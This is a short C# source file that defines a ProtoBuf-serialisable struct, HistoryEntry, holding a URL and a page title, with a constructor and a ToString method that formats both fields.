

using ProtoBuf;
using System;


namespace InvokedCommon.Structs
{
	[ProtoContract]
	public struct HistoryEntry
	{
		[ProtoMember(1)]
		public string url;
		[ProtoMember(2)]
		public string title;

		public HistoryEntry(string _url, string _title)
		{
			this.url = _url;
			this.title = _title;
		}

		public override string ToString()
		{
			return "URL: " + this.url + Environment.NewLine + "TITLE: " + this.title;
		}
	}
}